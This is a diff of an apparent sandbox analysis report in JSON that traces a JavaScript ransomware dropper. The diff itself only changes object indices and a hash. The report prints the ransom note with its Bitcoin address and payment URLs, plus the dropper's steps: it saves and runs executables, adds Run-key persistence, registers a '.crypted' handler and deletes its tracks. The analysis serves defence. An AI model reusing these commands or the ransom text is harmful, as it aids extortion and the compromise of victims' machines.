@@ -34,7 +34,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript writes data to the console\n\t\tTextStream[20].WriteLine(ATTENTION!)\n\n\t\tTextStream[20].WriteLine()\n\n\t\tTextStream[20].WriteLine(All your documents, photos, databases and other important personal files)\n\n\t\tTextStream[20].WriteLine(were encrypted using strong RSA-1024 algorithm with a unique key.)\n\n\t\tTextStream[20].WriteLine(To restore your files you have to pay 0.51130 BTC (bitcoins).)\n\n\t\tTextStream[20].WriteLine(Please follow this manual:)\n\n\t\tTextStream[20].WriteLine(1. Create Bitcoin wallet here:)\n\n\t\tTextStream[20].WriteLine(      https://blockchain.info/wallet/new)\n\n\t\tTextStream[20].WriteLine(2. Buy 0.51130 BTC with cash, using search here:)\n\n\t\tTextStream[20].WriteLine(      https://localbitcoins.com/buy_bitcoins)\n\n\t\tTextStream[20].WriteLine(3. Send 0.51130 BTC to this Bitcoin address:)\n\n\t\tTextStream[20].WriteLine(      1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs)\n\n\t\tTextStream[20].WriteLine(4. Open one of the following links in your browser to download decryptor:)\n\n\t\tTextStream[20].WriteLine(      http://projectdare.co.uk/counter/?a=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYC...\n\t\tTextStream[20].WriteLine(      http://hotel.internetdsl.pl/counter/?a=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiK...\n\t\tTextStream[20].WriteLine(      http://tt-metall.ru/counter/?a=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs)\n\n\t\tTextStream[20].WriteLine(      http://www.wordbaasoverdebal.nl/counter/?a=1PdN3rw5BbYzjH4bs9J7gNBbDH...\n\t\tTextStream[20].WriteLine(      http://tintssori.com.mialias.net/counter/?a=1PdN3rw5BbYzjH4bs9J7gNBbD...\n\t\tTextStream[20].WriteLine(5. Run decryptor to restore your files.)\n\n\t\tTextStream[20].WriteLine(PLEASE REMEMBER:)\n\n\t\tTextStream[20].WriteLine(      - If you do not pay in 3 days YOU LOOSE ALL YOUR FILES.)\n\n\t\tTextStream[20].WriteLine(      - Nobody can help you except us.)\n\n\t\tTextStream[20].WriteLine(      - It`s useless to reinstall Windows, update antivirus software, etc.)...\n\t\tTextStream[20].WriteLine(      - Your files can be decrypted only after you make payment.)\n\n\t\tTextStream[20].WriteLine(      - You can find this manual on your desktop (DECRYPT.txt).)\n\n\t\tTextStream[21].WriteLine(1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs)\n",
+        "body": "JavaScript writes data to the console\n\t\tTextStream[21].WriteLine(ATTENTION!)\n\n\t\tTextStream[21].WriteLine()\n\n\t\tTextStream[21].WriteLine(All your documents, photos, databases and other important personal files)\n\n\t\tTextStream[21].WriteLine(were encrypted using strong RSA-1024 algorithm with a unique key.)\n\n\t\tTextStream[21].WriteLine(To restore your files you have to pay 0.51130 BTC (bitcoins).)\n\n\t\tTextStream[21].WriteLine(Please follow this manual:)\n\n\t\tTextStream[21].WriteLine(1. Create Bitcoin wallet here:)\n\n\t\tTextStream[21].WriteLine(      https://blockchain.info/wallet/new)\n\n\t\tTextStream[21].WriteLine(2. Buy 0.51130 BTC with cash, using search here:)\n\n\t\tTextStream[21].WriteLine(      https://localbitcoins.com/buy_bitcoins)\n\n\t\tTextStream[21].WriteLine(3. Send 0.51130 BTC to this Bitcoin address:)\n\n\t\tTextStream[21].WriteLine(      1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs)\n\n\t\tTextStream[21].WriteLine(4. Open one of the following links in your browser to download decryptor:)\n\n\t\tTextStream[21].WriteLine(      http://projectdare.co.uk/counter/?a=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYC...\n\t\tTextStream[21].WriteLine(      http://hotel.internetdsl.pl/counter/?a=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiK...\n\t\tTextStream[21].WriteLine(      http://tt-metall.ru/counter/?a=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs)\n\n\t\tTextStream[21].WriteLine(      http://www.wordbaasoverdebal.nl/counter/?a=1PdN3rw5BbYzjH4bs9J7gNBbDH...\n\t\tTextStream[21].WriteLine(      http://tintssori.com.mialias.net/counter/?a=1PdN3rw5BbYzjH4bs9J7gNBbD...\n\t\tTextStream[21].WriteLine(5. Run decryptor to restore your files.)\n\n\t\tTextStream[21].WriteLine(PLEASE REMEMBER:)\n\n\t\tTextStream[21].WriteLine(      - If you do not pay in 3 days YOU LOOSE ALL YOUR FILES.)\n\n\t\tTextStream[21].WriteLine(      - Nobody can help you except us.)\n\n\t\tTextStream[21].WriteLine(      - It`s useless to reinstall Windows, update antivirus software, etc.)...\n\t\tTextStream[21].WriteLine(      - Your files can be decrypted only after you make payment.)\n\n\t\tTextStream[21].WriteLine(      - You can find this manual on your desktop (DECRYPT.txt).)\n\n\t\tTextStream[22].WriteLine(1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs)\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -56,7 +56,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an object representing a hard drive\n\t\tnew DriveObject[18](C:)\n\n\t\tDriveObject[18](C:).name = (string) 'C:'\n\n\t\tnew Collection[19]([?  {?    id: 18,?    _name: 'DriveObject[18](C:)',?    _availablespace: '',?    ...",
+        "body": "JavaScript creates an object representing a hard drive\n\t\tnew DriveObject[19](C:)\n\n\t\tDriveObject[19](C:).name = (string) 'C:'\n\n\t\tnew Collection[20]([?  {?    id: 19,?    _name: 'DriveObject[19](C:)',?    _availablespace: '',?    ...",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -78,7 +78,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript looks at the environment strings\n\t\tWScript.Shell[14].ExpandEnvironmentStrings(%TEMP%) => C:\\Users\\User\\AppData\\Local\\Temp\n",
+        "body": "JavaScript looks at the environment strings\n\t\tWScript.Shell[15].ExpandEnvironmentStrings(%TEMP%) => C:\\Users\\User\\AppData\\Local\\Temp\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -100,7 +100,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject to gain access to the computer's file system\n\t\tWScript.CreateObject(Scripting.FileSystemObject)\n\n\t\tnew Scripting.FileSystemObject[17]\n\n\t\tScripting.FileSystemObject[17].FileExists(C:\\Users\\User\\AppData\\Local\\Temp\\a.txt) => false\n\n\t\tScripting.FileSystemObject[17].FileExists(C:\\Users\\User\\AppData\\Local\\Temp\\a.exe) => true\n\n\t\tScripting.FileSystemObject[17].FileExists(C:\\Users\\User\\AppData\\Local\\Temp\\php4ts.dll) => true\n\n\t\tScripting.FileSystemObject[17].FileExists(C:\\Users\\User\\AppData\\Local\\Temp\\a.php) => true\n\n\t\tScripting.FileSystemObject[17].CreateTextFile(C:\\Users\\User\\AppData\\Local\\Temp\\a.txt, true, undefine...\n\t\tScripting.FileSystemObject[17].CreateTextFile(C:\\Users\\User\\AppData\\Local\\Temp\\a.php, true, undefine...",
+        "body": "JavaScript creates an ActiveXObject to gain access to the computer's file system\n\t\tWScript.CreateObject(Scripting.FileSystemObject)\n\n\t\tnew Scripting.FileSystemObject[18]\n\n\t\tScripting.FileSystemObject[18].FileExists(C:\\Users\\User\\AppData\\Local\\Temp\\a.txt) => false\n\n\t\tScripting.FileSystemObject[18].FileExists(C:\\Users\\User\\AppData\\Local\\Temp\\a.exe) => true\n\n\t\tScripting.FileSystemObject[18].FileExists(C:\\Users\\User\\AppData\\Local\\Temp\\php4ts.dll) => true\n\n\t\tScripting.FileSystemObject[18].FileExists(C:\\Users\\User\\AppData\\Local\\Temp\\a.php) => true\n\n\t\tScripting.FileSystemObject[18].CreateTextFile(C:\\Users\\User\\AppData\\Local\\Temp\\a.txt, true, undefine...\n\t\tScripting.FileSystemObject[18].CreateTextFile(C:\\Users\\User\\AppData\\Local\\Temp\\a.php, true, undefine...",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -122,7 +122,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[14]\n",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[15]\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -144,7 +144,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs dropped executable\n\t\tWScript.Shell[14].Run(C:\\Users\\User\\AppData\\Local\\Temp\\a1.exe, 1, 0)\n\n\t\tWScript.Shell[14].Run(C:\\Users\\User\\AppData\\Local\\Temp\\a2.exe, 1, 0)\n\n\t\tWScript.Shell[14].Run(%COMSPEC% /c REG ADD \"HKCR\\Crypted\\shell\\open\\command\" /ve /t REG_SZ /F /D \"no...\n\t\tWScript.Shell[14].Run(%COMSPEC% /c C:\\Users\\User\\AppData\\Local\\Temp\\a.exe \"C:\\Users\\User\\AppData\\Loc...\n\t\tWScript.Shell[14].Run(%COMSPEC% /c notepad.exe \"C:\\Users\\User\\AppData\\Local\\Temp\\a.txt\", 0, 0)\n\n\t\tWScript.Shell[14].Run(%COMSPEC% /c DEL \"C:\\Users\\User\\AppData\\Local\\Temp\\a.exe\", 0, 0)\n",
+        "body": "JavaScript runs dropped executable\n\t\tWScript.Shell[15].Run(C:\\Users\\User\\AppData\\Local\\Temp\\a1.exe, 1, 0)\n\n\t\tWScript.Shell[15].Run(C:\\Users\\User\\AppData\\Local\\Temp\\a2.exe, 1, 0)\n\n\t\tWScript.Shell[15].Run(%COMSPEC% /c REG ADD \"HKCR\\Crypted\\shell\\open\\command\" /ve /t REG_SZ /F /D \"no...\n\t\tWScript.Shell[15].Run(%COMSPEC% /c C:\\Users\\User\\AppData\\Local\\Temp\\a.exe \"C:\\Users\\User\\AppData\\Loc...\n\t\tWScript.Shell[15].Run(%COMSPEC% /c notepad.exe \"C:\\Users\\User\\AppData\\Local\\Temp\\a.txt\", 0, 0)\n\n\t\tWScript.Shell[15].Run(%COMSPEC% /c DEL \"C:\\Users\\User\\AppData\\Local\\Temp\\a.exe\", 0, 0)\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -166,7 +166,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[14].Run(C:\\Users\\User\\AppData\\Local\\Temp\\a1.exe, 1, 0)\n\n\t\tWScript.Shell[14].Run(C:\\Users\\User\\AppData\\Local\\Temp\\a2.exe, 1, 0)\n\n\t\tWScript.Shell[14].Run(%COMSPEC% /c REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"...\n\t\tWScript.Shell[14].Run(%COMSPEC% /c REG ADD \"HKCR\\.crypted\" /ve /t REG_SZ /F /D \"Crypted\", 0, 0)\n\n\t\tWScript.Shell[14].Run(%COMSPEC% /c REG ADD \"HKCR\\Crypted\\shell\\open\\command\" /ve /t REG_SZ /F /D \"no...\n\t\tWScript.Shell[14].Run(%COMSPEC% /c copy /y \"C:\\Users\\User\\AppData\\Local\\Temp\\a.txt\" \"%AppData%\\Deskt...\n\t\tWScript.Shell[14].Run(%COMSPEC% /c copy /y \"C:\\Users\\User\\AppData\\Local\\Temp\\a.txt\" \"%UserProfile%\\D...\n\t\tWScript.Shell[14].Run(%COMSPEC% /c C:\\Users\\User\\AppData\\Local\\Temp\\a.exe \"C:\\Users\\User\\AppData\\Loc...\n\t\tWScript.Shell[14].Run(%COMSPEC% /c notepad.exe \"C:\\Users\\User\\AppData\\Local\\Temp\\a.txt\", 0, 0)\n\n\t\tWScript.Shell[14].Run(%COMSPEC% /c DEL \"C:\\Users\\User\\AppData\\Local\\Temp\\a.php\", 0, 0)\n\n\t\tWScript.Shell[14].Run(%COMSPEC% /c DEL \"C:\\Users\\User\\AppData\\Local\\Temp\\a.exe\", 0, 0)\n\n\t\tWScript.Shell[14].Run(%COMSPEC% /c DEL \"C:\\Users\\User\\AppData\\Local\\Temp\\php4ts.dll\", 0, 0)\n",
+        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[15].Run(C:\\Users\\User\\AppData\\Local\\Temp\\a1.exe, 1, 0)\n\n\t\tWScript.Shell[15].Run(C:\\Users\\User\\AppData\\Local\\Temp\\a2.exe, 1, 0)\n\n\t\tWScript.Shell[15].Run(%COMSPEC% /c REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"...\n\t\tWScript.Shell[15].Run(%COMSPEC% /c REG ADD \"HKCR\\.crypted\" /ve /t REG_SZ /F /D \"Crypted\", 0, 0)\n\n\t\tWScript.Shell[15].Run(%COMSPEC% /c REG ADD \"HKCR\\Crypted\\shell\\open\\command\" /ve /t REG_SZ /F /D \"no...\n\t\tWScript.Shell[15].Run(%COMSPEC% /c copy /y \"C:\\Users\\User\\AppData\\Local\\Temp\\a.txt\" \"%AppData%\\Deskt...\n\t\tWScript.Shell[15].Run(%COMSPEC% /c copy /y \"C:\\Users\\User\\AppData\\Local\\Temp\\a.txt\" \"%UserProfile%\\D...\n\t\tWScript.Shell[15].Run(%COMSPEC% /c C:\\Users\\User\\AppData\\Local\\Temp\\a.exe \"C:\\Users\\User\\AppData\\Loc...\n\t\tWScript.Shell[15].Run(%COMSPEC% /c notepad.exe \"C:\\Users\\User\\AppData\\Local\\Temp\\a.txt\", 0, 0)\n\n\t\tWScript.Shell[15].Run(%COMSPEC% /c DEL \"C:\\Users\\User\\AppData\\Local\\Temp\\a.php\", 0, 0)\n\n\t\tWScript.Shell[15].Run(%COMSPEC% /c DEL \"C:\\Users\\User\\AppData\\Local\\Temp\\a.exe\", 0, 0)\n\n\t\tWScript.Shell[15].Run(%COMSPEC% /c DEL \"C:\\Users\\User\\AppData\\Local\\Temp\\php4ts.dll\", 0, 0)\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -188,7 +188,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript writes data to disk\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a1.exe, 2)\n\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a2.exe, 2)\n\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a.exe, 2)\n\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\php4ts.dll, 2)\n\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a.php, 2)\n\n\t\t    \t   \t  var xnkt = 'xa.saveToFile'\n\t\t    \t   \t  var bczr = '.saveToFile('",
+        "body": "JavaScript writes data to disk\n\t\tADODB.Stream[17].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a1.exe, 2)\n\n\t\tADODB.Stream[17].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a2.exe, 2)\n\n\t\tADODB.Stream[17].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a.exe, 2)\n\n\t\tADODB.Stream[17].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\php4ts.dll, 2)\n\n\t\tADODB.Stream[17].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a.php, 2)\n\n\t\t    \t   \t  var xnkt = 'xa.saveToFile'\n\t\t    \t   \t  var bczr = '.saveToFile('",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -210,7 +210,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript writes executable file to disk\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a1.exe, 2)\n\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a2.exe, 2)\n\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a.exe, 2)\n\n\t\tADODB.Stream[16].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\php4ts.dll, 2)\n",
+        "body": "JavaScript writes executable file to disk\n\t\tADODB.Stream[17].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a1.exe, 2)\n\n\t\tADODB.Stream[17].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a2.exe, 2)\n\n\t\tADODB.Stream[17].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\a.exe, 2)\n\n\t\tADODB.Stream[17].SaveToFile(C:\\Users\\User\\AppData\\Local\\Temp\\php4ts.dll, 2)\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -386,7 +386,7 @@
     "supplementary": [
       {
         "name": "temp_javascript.js",
-        "sha256": "793de99a32f945017d93aaf0bafae505f67e4746dee5398458b6da8acc49c1be"
+        "sha256": "a0f3ab8e7975e116166e51d7c67126caa201cc8bb565ba7679a49dcc25103a15"
       }
     ]
   },
